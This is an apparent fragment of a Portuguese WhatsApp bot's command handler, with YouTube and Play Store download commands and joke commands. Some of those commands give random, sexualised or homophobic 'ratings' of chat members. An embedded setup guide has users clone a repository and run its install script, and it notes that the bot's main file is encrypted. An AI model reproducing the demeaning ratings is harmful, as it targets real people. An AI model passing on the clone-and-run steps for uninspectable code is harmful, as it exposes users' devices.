                if (args.length == 0) return reply(`Exemplo: ${prefix + command} telegram`)
                query = args.join(" ")
                reply(enviar.espere)
                try {
                    get_result = await fetchJson(`https://p7api.xyz/api/playstore?nome=${query}&apikey=${setting.apikey}`)
                    get_result = get_result.resultado
                    ini_mn1k = 'Play Store Pesquisa : \n'
                    for (var x of get_result) {
                        ini_mn1k += `📄 APK: ${x.nome}\n`
                        ini_mn1k += `🌀 Link: ${x.link}\n`
                        ini_mn1k += `🏦 Empresa: ${x.criador}\n`
                        ini_mn1k += `🤵🏻 Link Criador: ${x.link_criador}\n\n`
                    }
                    const templateButtonsoisbo = [
                        { index: 1, urlButton: { displayText: '⚙️ CONTATOS', url: 'https://contate.me/NeoTecnolog' } },
                    ]
                    const buttonMessageoidasdp = {
                        image: { url: 'https://telegra.ph/file/93196f78ccb024f3d8814.jpg' },
                        caption: ini_mn1k,
                        footer: `By: ${NomeDoBot}`,
                        templateButtons: templateButtonsoisbo
                    }


                    await conn.sendMessage(m.chat, buttonMessageoidasdp)
                } catch { reply('Erro ao Pesquisar, Tente Novamente...') }
                break

            case 'wa.me':
            case 'wame':
                numi = sender.replace('@s.whatsapp.net', '')
                msg = args.toString().split(',').join('%20').split('@').join('')
                msg1 = msg.replace(numi, '')
                s = msg1.substring(0)
                if (msg.length < 1) return reply(`Defina a Mensagem ex: ${prefix}wame oi lindo`)
                apim = `https://api.whatsapp.com/send?phone=${numi}&text=${s}`
                reply(apim)
                break

            case 'wa.me2':
            case 'wame2':
                if (m.message.extendedTextMessage === undefined || m.message.extendedTextMessage === null) return reply('marque um amigo com @\nExemplo: @p7 vai se fuder kkk')
                num = m.message.extendedTextMessage.contextInfo.mentionedJid[0]
                numi = num.replace('@s.whatsapp.net', '')
                msg = args.toString().split(',').join('%20').split('@').join('')
                msg1 = msg.replace(numi, '')
                s = msg1.substring(3)
                if (msg.length < 1) return reply('defina a Mensagem')
                apim = `https://api.whatsapp.com/send?phone=${numi}&text=${s}`
                reply(apim)
                break

            case 'tabela':
                await conn.sendMessage(from, { text: tabela(NomeDoBot) }, { quoted: m })
                break

            case 'perfil':
                try {
                    ppimg = await conn.profilePictureUrl(m.sender, 'image')
                } catch {
                    ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
                }

                var conselho = palavras[Math.floor(Math.random() * palavras.length)]
                const nivelgado = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
                const nivelgado2 = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
                const nivelgador = nivelgado[Math.floor(Math.random() * (nivelgado.length))]
                const nivelgado2r = nivelgado2[Math.floor(Math.random() * (nivelgado2.length))]
                const puta = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
                const puta2 = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
                const putar = puta[Math.floor(Math.random() * (puta.length))]
                const putar2 = puta2[Math.floor(Math.random() * (puta2.length))]
                const gostosura = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
                const gostosura2 = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
                const gostosurar = gostosura[Math.floor(Math.random() * (gostosura.length))]
                const gostosurar2 = gostosura2[Math.floor(Math.random() * (gostosura2.length))]
                gadop = `${Math.floor(Math.random() * 100)}`
                const programa = Math.ceil(Math.random() * 10000)
                const dptr = `     「 🔥 ~_*PERFIL*_~ 🌈 」
🗒 *Nome* : *${pushname}*
🪀 *Número* : https://wa.me/${sender.split("@")[0]}
🐂 *Nível gado* : *${nivelgador}${nivelgado2r}%*
📱 *Seu Célular* : ${m.key.id.length > 21 ? 'Android 🤣' : m.key.id.substring(0, 2) == '3A' ? 'IOS😂😂😅' : 'Zap zap web 😂😂☝🏼😅'}
😈 *Nível puta* : *${putar}${putar2}%*
😋 *Nível de gostosura* : *${gostosurar}${gostosurar2}%*
🍼 *Valor do programa* : *R$${programa}*

➻ *~_CONSELHO_~* :
${conselho}`
                daftarimg = await getBuffer(ppimg)
                conn.sendMessage(from, { image: daftarimg, caption: dptr, footer: `By: ${NomeDoBot}` }, { quoted: m })

                break

            case 'conselhobiblico':
            case 'conselhosbiblico':
            case 'conselhosb':
            case 'conselhob':
                var conselhosbb = conselhob[Math.floor(Math.random() * conselhob.length)]
                jr = `${tempo} ${pushname} 

Conselhos Bíblico para você: 

- ${conselhosbb} 

> Bot: ${NomeDoBot}
> Grupo: ${groupName}`
                await conn.sendMessage(from, { text: jr }, { quoted: m })
                break

            case 'git':
            case 'gitdobot':
                wew = fs.readFileSync('./logo/logo.jpg')

                conn.sendMessage(m.chat, {
                    image: wew, caption: `
​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​=======≠≠≠===========≠≠========

Meu Canal: https://youtube.com/c/P7kayke

===============================

O INDEX ESTÁ CRIPTOGRAFADO, MAS DA PRA SER DONO E ALTERAR OS MENU E AS FOTOS. 

QUISER O INDEX DESCRIPTOGRAFADO, SÓ NEGOCIANDO COM O DONO wa.me/558198539583 

INSTALAÇÃO DO TERMUX E OS PACOTES, SÓ SERÁ NESCESSÁRIO UTILIZAR 1 VEZ, APÓS O TERMUX INSTALADO.

(LEMBRANDO, TERMUX DA PLAY STORE NÃO PRESTA, ENTÃO SE TIVER COM O DA PLAY STORE, VAI TER MUITOS ERROS, EMBAIXO DESSE TEXTO, TEM O DOWNLOAD DE UM TERMUX MAIS AVANÇADO.) 

(ALGUMAS DAS VEZES, SERÁ NESCESSÁRIO DA ENTER, QUANDO APARECER [default=N?]
 E SE APARECER Y/N, EM ALGUM DELES, APENAS DIGITE Y E DE ENTER.)

COLE TODOS ESSES COMANDOS JUNTOS NO TERMUX.. 
-- De acordo com a separação.

-----------------------------------
A cada divisão, é um comando que deves lançar no termux, e apertar enter, junto mesmo, da fórma que tiver.

(1)--------------------------------------

(Aqui vai ser preciso apertar enter, quando lançar esse comando, quando ele pausar e aparecer "[default=N] ?", Ok?)

------------------------------------------

pkg upgrade -y && pkg update -y && pkg install nodejs -y && pkg install nodejs-lts -y && pkg install wget -y && pkg install git -y && pkg install python -y

(2)---------------------------------------

        termux-setup-storage 

(3)---------------------------------------

          cd /sdcard

(4)----------------------------------------

       git clone https://github.com/Kaykep7/botp7.git

(5)----------------------------------------

(Quando terminar esse, vai ser o final)

            cd botp7

(6)----------------------------------------
    
  pkg install ffmpeg -y && bash install.sh

(7)---------------------------------------

(Quando terminar, só digitar este comando:


             sh start.sh 


para ligar, e escanear o qrcode, vai precisar de um segundo celular, pra tirar a foto do qrcode e utilizar como base, para escanear a foto que você tirou, com um whatsapp secundário, e escanear a foto, através do WhatsApp web, que fica nos 3 pontinhos do WhatsApp, ou pode se chamar, aparelhos conectados, ou linked devices.)

-------------------------------------------

COMANDOS PARA LIGAR, APÓS O TERMUX FECHADO. 

-------------------------------------------

>    cd /sdcard/botp7

>    sh start.sh 

Somente esses 2.

-------------------------------------------
(SDCARD É O ARMAZENAMENTO INTERNO DO SEU CELULAR, ENTÃO A PASTA DO BOT TEM QUE ESTÁ LÁ, CASO QUEIRA ALTERAR ALGO, ALTERE LÁ)

instale algo para editar o bot, você só vai mecher na pasta dono, em settings.json, lá é o arquivo nescessario de todo bot, colocando o nome do bot entre as " ", alterará o nome de todo bot, exemplo: "NomeDoBot": "P7-BOT",

PODE UTILIZAR O NOME COM FONTE, TAMBÉM.
===≠≠≠==========================

Lembrando:
Todo aplicativo que instalamos, ele vem com otimização de bateria, e isso faz o aplicativo fechar após sair dele, ou ele parar de funcionar, ou até deixa o aplicativo muito lento, então pra desativar é o seguinte.
Vá em configurações do celular, aplicativos, procure o termux, clique, clique em bateria, vai ter um nome "otimizando a bateria" clique, la encima vai ter um nome "Aplicat. não otimizados" clique, e escolha todos, e procure o termux pesquisando o nome, ou manual, e desative se estiver ativado a otimização, desative do whatsapp também.

=====≠≠========================
LEMBRANDO NOVAMENTE :

para ligar

cd /sdcard/botp7

sh start.sh
===============================

Para trocar a foto do menu, só é 
enviar uma foto no whatsapp e marcar
ela com o comando : #fotomenu

===============================

 Se quiser alterar o áudio do menu, fica na pasta audios, chamado menucmd.mp3, só colocar outro no mesmo lugar com o mesmo nome e substituir.

===≠≠=============≠≠==========

Para gerar outro qrcode, você precisa apagar o arquivo BarBar.json, que fica dentro da pasta do bot, depois ligar normalmente, se quer apagar o qrcode pelo termux é apenas isso : 

rm BarBar.json`}, { quoted: m })

                break

            /*case 'playb': {
            var t = args.join(' ')
            if (!t) return m.reply('Cadê o nome da música?')
            anu = await fetchJson(`https://p7api.xyz/api/ytsrc?nome=${t}&apikey=${setting.apikey}`)
            const objs = []
            for(i=0;i< anu.resultado.length; ++i) {
            let data = {
            rowId: `${prefix}ytmp3 `+ anu.resultado[i].url,
            title: `.`,
            description: anu.resultado[i].title
            }
            objs.push(data)
            }
            
            const button = {
            title: "✅ Músicas encotradas ✅",
            buttonText: "Mostra lista de músicas",
            description: `Palavra chave: ${t}`,
            listType: 1,
            sections: [
            {title: "Músicas relacionadas",
            rows: objs
            }
            ]
            }
            sendListMsg(button.title, button.description, button.buttonText, button.sections)  
            }
            break*/

            case 'play3': case 'audio3':


                if (!c) return reply(mess.erro_c)
                m.reply(enviar.espere)
                pesquisa = await yts(c);
                pesquisa2 = pesquisa.all
                resultado = pesquisa2[0].url
                ytPlay(q).then(async (data) => {
                    let txt = `*----「 YOUTUBE PLAY 」----*\n\n`
                    txt += `*📄 Título :* ${data.título}\n`
                    txt += `*⚖️ Tamanho :* ${data.tamanho}\n`
                    txt += `*👁️ visualizações :* ${data.visualizações}\n`
                    txt += `*👍🏻Likes :* ${data.likes}\n`
                    txt += `*👎🏻Deslikes :* ${data.deslikes}\n`
                    txt += `*⏱️ Publicado :* ${data.data_de_upload}\n`
                    txt += `*Aguarde estou processando o download...*`
                    enviarArquivoDoLink(m.chat, data.capa, txt, m)
                    //                    enviarArquivoDoLink(m.chat, data.resultado, '', m)
                    //                    conn.sendMessage(m.chat, { audio: { url: data.resultado } }, {mimetype: 'audio/mp4', duration: 359996400, ptt:false, quoted: m,thumbnail: thumb, contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title:data.título,body:"",mediaType:"2",thumbnail:thumb,mediaUrl:resultado}}}).catch(() => m.reply(mess.erro))        
                    conn.sendMessage(m.chat, { audio: { url: data.resultado } }, { mimetype: 'audio/mpeg' }, { quoted: m })
                })

                break
            case 'playvideo2': case 'video2':


                if (!c) return reply(mess.erro_c)
                m.reply(enviar.espere)
                ytPlayMp4(q).then(async (data) => {
                    let txt = `*----「 YOUTUBE PLAY 」----*\n\n`
                    txt += `*📄 Título :* ${data.título}\n`
                    txt += `*🎞️ Canal :* ${data.canal}\n`
                    txt += `*👁️ visualizações :* ${data.visualizações}\n`
                    txt += `*⏱️ Publicado :* ${data.publicado}\n`
                    txt += `*Aguarde estou processando o download...*`
                    enviarArquivoDoLink(m.chat, data.thumb, txt, m)
                    enviarArquivoDoLink(m.chat, data.url, '', m)
                })

                break
            case 'play': {
                if (!c) return reply(mess.erro_c)
                anu = await fetchJson(`https://p7api.xyz/api/ytplayv2?nome=${c}&apikey=${setting.apikey}`)
                if (anu.mensagem) return reply(anu.mensagem)
                try {
                    m.reply(enviar.espere)

                    let txt = `*----「 YOUTUBE PLAY 」----*\n\n`
                    txt += `*📄 Título :* ${anu.resultado.título}\n`
                    txt += `*🎞️ Canal :* ${anu.resultado.canal}\n`
                    txt += `*👁️ Visualizações :* ${anu.resultado.visualizações}\n`
                    txt += `*⏱️ Publicado :* ${anu.resultado.data_de_upload}\n`
                    txt += `*📈 Likes :* ${anu.resultado.likes}\n`
                    txt += `*💽 Tamanho :* ${anu.resultado.tamanho}\n`
                    buffer = await getBuffer(anu.resultado.capa)
                    let message = await prepareWAMessageMedia({ image: buffer }, { upload: conn.waUploadToServer })
                    const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
                        templateMessage: { hydratedTemplate: { imageMessage: message.imageMessage, hydratedContentText: txt, hydratedButtons: [{ urlButton: { displayText: '⚙️ CONTATOS', url: 'https://contate.me/NeoTecnolog' } }, { quickReplyButton: { displayText: '🎥 VIDEO 🎥', id: `${prefix}playvideo ${anu.resultado.título}` } }, { quickReplyButton: { displayText: '🎵 AUDIO 🎵', id: `${prefix}playmp3 ${anu.resultado.título}` } }, { quickReplyButton: { displayText: '📁 DOCUMENTO 📁', id: `${prefix}playdoc ${anu.resultado.título}` } }] } }
                    }), { userJid: m.chat, quoted: m })
                    conn.relayMessage(m.chat, template.message, { messageId: template.key.id })
                } catch (anu) {
                    m.reply('[ ! ] Erro ao Pesquisar no YouTube')
                }
            }

                break
            case 'playvideo': {


                if (!c) return reply(mess.erro_c)
                try {
                    anu = await fetchJson(`https://p7api.xyz/api/ytplaymp4?nome=${c}&apikey=${setting.apikey}`)
                    if (anu.mensagem) return reply(anu.mensagem)
                    m.reply(enviar.espere)
                    let txt = `*----「 YOUTUBE PLAY VÍDEO 」----*\n\n`
                    txt += `*📄 Título :* ${anu.resultado.título}\n`
                    txt += `*🎞️ Canal :* ${anu.resultado.canal}\n`
                    txt += `*👁️ visualizações :* ${anu.resultado.visualizações}\n`
                    txt += `*⏱️ Publicado :* ${anu.resultado.publicado}\n`
                    //buffer = await getBuffer(undefined) 
                    videokk = await getBuffer(anu.resultado.url)
                    conn.sendMessage(m.chat,
                        {
                            video: videokk,
                            caption: txt,
                            thumbnail: null
                        }, { quoted: m })
                } catch { m.reply('[ ! ] Erro ao Baixar') }
            }
                break
            case 'playmp3': {


                if (!c) return reply(mess.erro_c)
                m.reply(enviar.espere)

                try {
                    anu2 = await fetchJson(`https://p7api.xyz/api/ytsrc?nome=${c}&apikey=${setting.apikey}`)
                    anu = await fetchJson(`https://p7api.xyz/api/ytmp3v2?link=${anu2.resultado[0].url}&apikey=${setting.apikey}`)

                    //buffer = await getBuffer(undefined) 
                    audionkkk = await getBuffer(anu.resultado.resultado)

                    conn.sendMessage(m.chat,
                        {
                            audio: audionkkk,
                            mimetype: 'audio/mpeg',
                            thumbnail: null
                        }, { quoted: m })
                } catch { m.reply('[ ! ] Erro ao Baixar') }
            }

                break
            case 'playdoc': {


                if (!c) return reply(mess.erro_c)

                try {
                    m.reply(enviar.espere)
                    anu = await fetchJson(`https://p7api.xyz/api/ytplaymp4?nome=${c}&apikey=${setting.apikey}`)
                    if (anu.mensagem) return reply(anu.mensagem)
                    let txt = `*----「 YOUTUBE PLAY GIF 」----*\n\n`
                    txt += `*📄 Título :* ${anu.resultado.título}\n`
                    txt += `*🎞️ Canal :* ${anu.resultado.canal}\n`
                    txt += `*👁️ visualizações :* ${anu.resultado.visualizações}\n`
                    txt += `*⏱️ Publicado :* ${anu.resultado.publicado}\n`
                    //buffer = await getBuffer(undefined) 
                    audiodockk = await getBuffer(anu.resultado.url)
                    conn.sendMessage(m.chat,
                        {
                            document: audiodockk,
                            mimetype: 'audio/mpeg',
                            fileName: `${anu.resultado.título}.mp3`,
                            caption: txt,
                            thumbnail: null
                            //gifPlayback: true
                        }, { quoted: m })
                } catch { m.reply('[ ! ] Erro ao Baixar') }
            }
                break
            case 'ytmp3':
            case 'youtbmp3': {


                if (!c) return reply(mess.erro_c)
                if (!isUrl(args[0]) && !args[0].includes('youtu.be')) return reply('Preciso de um link que seja do youtube!')
                slamsc = `${c.split("https://youtu.be/")[0]}`
                teste = 'https://youtu.be/' + slamsc
                m.reply(enviar.espere)
                data = await fetchJson(`https://p7api.xyz/api/ytmp3?link=${teste}&apikey=${setting.apikey}`)
                let txt = `*----「 YTMP3 」----*\n\n`
                txt += `*📄 Título :* ${data.título}\n`
                txt += `*🎞️ Canal :* ${data.canal}\n`
                txt += `*👁️ visualizações :* ${data.visualizações}\n`
                txt += `*⏱️ Publicado :* ${data.publicado}\n`
                txt += `*Aguarde estou processando o download...*`
                buffer = await getBuffer(data.thumb)
                audiokkkk = await getBuffer(data.link)
                let message = await prepareWAMessageMedia({ image: buffer }, { upload: conn.waUploadToServer })
                const template = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
                    templateMessage: { hydratedTemplate: { imageMessage: message.imageMessage, hydratedContentText: txt, hydratedButtons: [{ urlButton: { displayText: '⚙️ CONTATOS', url: 'https://contate.me/NeoTecnolog' } }, { quickReplyButton: { displayText: '🎥 BAIXAR VÍDEO 🎥', id: `playvideo ${anu.resultado.título}` } }, { quickReplyButton: { displayText: '🎵 AUDIO 🎵', id: `playmp3 ${anu.resultado.título}` } }, { quickReplyButton: { displayText: '📝 DOCUMENTO 📝', id: `playdoc ${anu.resultado.título}` } }] } }
                }), { userJid: m.chat, quoted: m })
                conn.relayMessage(m.chat, template.message, { messageId: template.key.id })
            }
                conn.sendMessage(m.chat,
                    {
                        audio: audiokkkk,
                        mimetype: 'audio/mp4',
                        filename: `${data.título}.mp3`,
                        quoted: m,
                        thumbnail: null
                    })

                break
            case 'ytmp4':
            case 'youtbmp4':


                if (!c) return reply(mess.erro_c)
                if (!isUrl(args[0]) && !args[0].includes('youtu.be')) return reply('Preciso de um link que seja do youtube!')
                m.reply(enviar.espere)
                ytDonlodMp4(q).then(async (data) => {
                    let txt = `*----「 YTMP4 」----*\n\n`
                    txt += `*📄 Título :* ${data.título}\n`
                    txt += `*🎞️ Canal :* ${data.canal}\n`
                    txt += `*👁️ visualizações :* ${data.visualizações}\n`
                    txt += `*⏱️ Publicado :* ${data.publicado}\n`
                    txt += `*Aguarde estou processando o download...*`
                    enviarArquivoDoLink(m.chat, data.thumb, txt, m)
                    enviarArquivoDoLink(m.chat, data.link, '', m)
                })

                break

            case 'simi':
            case 'ia':
            case 'bot':
                try {

                    var IA2 = await fetchJson(`https://p7api.gustavonunes5.repl.co/api/?simi=${c}`)
                    if (IA2.success === 'please enter the text - text=hello') return m.reply('não entendi :/')


                    m.reply(IA2.success)

                } catch {
                    try {
                        var IA = await fetchJson(`https://p7api.xyz/api/simi?msg=${c}&apikey=${setting.apikey}`)
                        if (IA.resultado.resposta === 'Eu não resposta. Por favor me ensine.') return m.reply('não entendi :/')
                        m.reply(IA.resultado.resposta)
                    } catch {
                        reply('não entendi :/')
                    }
                }



                break
            case 'gerarnick':
            case 'geranick':
            case 'fazernick':
            case 'fazenick':
            case 'faznick':
                pega = await fetchJson(`https://p7api.xyz/api/styleText?texto=${c}&apikey=${setting.apikey}`)
                nicks = await pega.resultado
                const emoji = `🔮`
                await reply(`💈Nicks Gerados Com Sucesso!💈\n\n
${emoji} ${nicks["Circled"]}\n
${emoji} ${nicks["Circled (neg)"]}\n
${emoji} ${nicks["Fullwidth"]}\n
${emoji} ${nicks["Math bold"]}\n
${emoji} ${nicks["Math bold Fraktur"]}\n
${emoji} ${nicks["Math bold italic"]}\n
${emoji} ${nicks["Math bold script"]}\n
${emoji} ${nicks["Math double-struck"]}\n
${emoji} ${nicks["Math monospace"]}\n
${emoji} ${nicks["Math sans"]}\n
${emoji} ${nicks["Math sans bold"]}\n
${emoji} ${nicks["Math sans bold italic"]}\n
${emoji} ${nicks["Parenthesized"]}\n
${emoji} ${nicks["Regional Indicator"]}\n
${emoji} ${nicks["Squared"]}\n
${emoji} ${nicks["Squared (neg)"]}\n
${emoji} ${nicks["Tag"]}\n
${emoji} ${nicks["A-cute"]}\n
${emoji} ${nicks["CJK+Thai"]}\n
${emoji} ${nicks["Curvy 1"]}\n
${emoji} ${nicks["Curvy 2"]}\n
${emoji} ${nicks["Curvy 3"]}\n
${emoji} ${nicks["Faux Cyrillic"]}\n
${emoji} ${nicks["Faux Ethiopic"]}\n
${emoji} ${nicks["Math Fraktur"]}\n
${emoji} ${nicks["Rock Dots"]}\n
${emoji} ${nicks["Small Caps"]}\n
${emoji} ${nicks["Stroked"]}\n
${emoji} ${nicks["Subscript"]}\n
${emoji} ${nicks["Superscript"]}\n
${emoji} ${nicks["Inverted"]}\n
${emoji} ${nicks["Inverted Reversed"]}\n
${emoji} ${nicks["Reversed"]}\n
${emoji} ${nicks["Reversed Reversed"]}\n\n\n
 ➣   ▉║█▐▉▉▐▐▍█║▍▉▏▍▍
 ➣   ▉║█▐▉▉▐▐▍█║▍▉▏▍▍`)
                break

            case 'gay':
            case 'lgbtq':


                try {
                    ppuser = await conn.profilePictureUrl(m.sender, 'image')
                } catch {
                    ppuser = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
                }
                //rate = body.slice(5)
                m.reply(`⌛ *_Puxando a ficha de gay do @${m.sender.split("@")[0]}_* 😳`)
                setTimeout(async () => {
                    random = `${Math.floor(Math.random() * 110)}`
                    feio = random
                    boiola = random
                    if (boiola < 20) { bo = 'hmm... você é hetero😔' } else if (boiola == 21) { bo = '+/- boiola' } else if (boiola == 23) { bo = '+/- boiola' } else if (boiola == 24) { bo = '+/- boiola' } else if (boiola == 25) { bo = '+/- boiola' } else if (boiola == 26) { bo = '+/- boiola' } else if (boiola == 27) { bo = '+/- boiola' } else if (boiola == 2) { bo = '+/- boiola' } else if (boiola == 29) { bo = '+/- boiola' } else if (boiola == 30) { bo = '+/- boiola' } else if (boiola == 31) { bo = 'tenho minha desconfiança...😑' } else if (boiola == 32) { bo = 'tenho minha desconfiança...😑' } else if (boiola == 33) { bo = 'tenho minha desconfiança...😑' } else if (boiola == 34) { bo = 'tenho minha desconfiança...😑' } else if (boiola == 35) { bo = 'tenho minha desconfiança...😑' } else if (boiola == 36) { bo = 'tenho minha desconfiança...😑' } else if (boiola == 37) { bo = 'tenho minha desconfiança...😑' } else if (boiola == 3) { bo = 'tenho minha desconfiança...😑' } else if (boiola == 39) { bo = 'tenho minha desconfiança...😑' } else if (boiola == 40) { bo = 'tenho minha desconfiança...😑' } else if (boiola == 41) { bo = 'você é né?😏' } else if (boiola == 42) { bo = 'você é né?😏' } else if (boiola == 43) { bo = 'você é né?😏' } else if (boiola == 44) { bo = 'você é né?😏' } else if (boiola == 45) { bo = 'você é né?😏' } else if (boiola == 46) { bo = 'você é né?😏' } else if (boiola == 47) { bo = 'você é né?😏' } else if (boiola == 4) { bo = 'você é né?😏' } else if (boiola == 49) { bo = 'você é né?😏' } else if (boiola == 50) { bo = 'você é ou não?🧐' } else if (boiola > 51) {
                        bo = 'você é gay🙈'
                    }
                    ran = getRandom('.jpg')
                    rano = getRandom('.jpg')
                    buff = await getBuffer(ppuser)
                    fs.writeFileSync(ran, buff)
                    //m.reply(enviar.espere)
                    anu = await TelegraPh(ran)
                    oi = `https://p7api.xyz/api/canvas/gay?img=${util.format(anu)}&apikey=${setting.apikey}`
                    //m.reply(util.format(anu))
                    enviarArquivoDoLink(m.chat, oi, 'O quanto você é gay? \n\nVocê é: ❰ ' + random + '% ❱ gay 🏳️‍🌈\n\n *_' + bo + '_* ', m)
                    await fs.unlinkSync(`${ran}`)
                }, 7000)





                break

            case 'tapa':
            case 'bater':


                try {
                    ppuser = await conn.profilePictureUrl(m.sender, 'image')
                } catch {
                    ppuser = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
                }
                cc = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                if (cc === '@s.whatsapp.net') return reply('marca alguém :/')
                try {
                    ppcoitado = await conn.profilePictureUrl(cc, 'image')
                } catch {
                    ppcoitado = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
                }
                await m.reply(enviar.espere)
                ran = await getRandom('.jpg')
                rano = await getRandom('.jpg')
                buff = await await getBuffer(ppuser)
                await fs.writeFileSync(ran, buff)
                ran2 = await getRandom('.jpg')
                rano2 = await getRandom('.jpg')
                buff2 = await getBuffer(ppcoitado)
                await fs.writeFileSync(ran2, buff2)
                //m.reply(enviar.espere)
                anu = await TelegraPh(ran)
                anu2 = await TelegraPh(ran2)
                oi = `https://p7api.xyz/api/canvas/batslap?img=${util.format(anu)}&img2=${util.format(anu2)}&apikey=${setting.apikey}`
                //m.reply(util.format(anu))
                await fs.unlinkSync(ran2)
                await fs.unlinkSync(ran)
                await conn.sendMessage(from, { image: { url: oi }, "contextInfo": { mentionedJid: [cc, m.sender] }, caption: `@${m.sender.split('@')[0]} deu um tapa em @${cc.split('@')[0]} 😭` }, { quoted: m })
                break

            case 'rainbowequalizer':
            case 'robotr2':
            case 'captain':
            case 'purpleshiny':
            case 'rock':
            case 'peridot':
            case 'starpurple':
            case 'stargreen':
            case 'denimtext':
            case 'ultragloss':
            case 'goldfoil':
            case 'wicker':
            case 'darkgold':
            case 'blood':
            case 'fabric':
            case 'glossycarbon':
            case 'deluxegold':
            case 'glossyblue':
            case 'deluxe':
            case 'metalpurple':
            case 'holographic':
            case 'minion':
            case 'dark':
            case 'glue':
            case 'sandengraved':
            case 'sandwriting':
            case 'blackpink':
            case 'winter':
            case 'technology':
            case 'holiday':
            case 'wonderful':
            case 'multicolor':
            case 'watercolor':
            case 'gradient':
            case 'paper':
            case 'broken':
            case 'impressive':
            case 'demon':
            case 'fiction':
            case 'metallic':
            case 'bluecircuit':
            case 'sketch':
            case 'skeleton':
            case 'waterpipe':
            case '3drainbow':
            case 'scifi':
            case 'americanflag':
            case 'drug':
            case '3ddeep':
            case 'merrychristmas':
            case 'candycane':
            case 'naturalleaves':
            case 'joker':
            case 'firework':
            case 'galaxystyle':
            case 'generator':
            case 'cloud':
            case 'luxury':
            case 'sandsummer':
            case 'summerysand':
            case 'metaldark':
            case 'neontext':
            case '1917':
            case 'halloweenfire':
            case 'lava':
            case 'steeltext':
            case 'captain':
            case 'toxic':
            case 'horrorgift':
            case 'thunder':
            case 'christmas':
            case 'stone':
            case 'glossy':
            case 'embossed':
            case 'harry':
            case 'magma':
            case 'berry':
            case 'transformer':
            case 'spacetext': {
                if (c.length > 25) return reply('Vai escrever um texto é?, manda no maximo 25 caracteres')

                if (!q) return reply(`Exemplo: ${prefix + command} bot p7`)
                reply(`Estou fazendo... 🤠`)
                try {

                    await conn.sendMessage(m.chat, { image: { url: `https://p7api.xyz/api/textpro/${command}?texto=${text}&apikey=${setting.apikey}` }, caption: `*Text Pro:* ${command}` }, { quoted: m })
                } catch { reply('Deu Algo Errado Tente Novamente...') }
            }
                break

            case 'ninjalogo':
            case 'pornhub':
                if (c.length > 25) return reply('Vai escrever um texto é?, manda no maximo 25 caracteres')

                if (!q) return reply(`use ${prefix + command} texto1 + texto2`)
                texto1 = args[0]
                texto2 = args[1]
                try {
                    conn.sendMessage(m.chat, { image: { url: `https://p7api.xyz/api/textpro/${command}?texto=${texto1}&texto2=${texto2}&apikey=${setting.apikey}` } }, { quoted: m })
                } catch { reply('Deu Algo Errado Tente Novamente...') }
                break



            case 'data':
            case 'datas':
                m.reply(`${date + "/" + month + "/" + year + "\n" + hours + ":" + minutes + ":" + seconds}`)
                break
            case 'horas':
            case 'hora':
                m.reply(`${hours + ":" + minutes + ":" + seconds}`)
                break
            case 'ano':
            case 'anos':
                m.reply(`${year}`)
                break
            case 'dia':
            case 'dias':
                m.reply(`${date + "/" + month + "/" + year}`)
                break
            default:

                if (isCmd) {

                    m.reply(`╭❑➤──━── ⊱⊰ ──━──➤
│⊱ Olá: ${pushname}
│⊱ Horas: ${hours + ":" + minutes + ":" + seconds} 
│⊱ Dia de Hoje: ${date + "/" + month + "/" + year} 
├❑➤──━── ⊱⊰ ──━──➤
│⊱ Não encontrado: ${prefix}${command}
│⊱ Digite: ${prefix}menu
╰❑➤──━── ⊱⊰ ──━──➤`)
                }


        }


    } catch (err) {
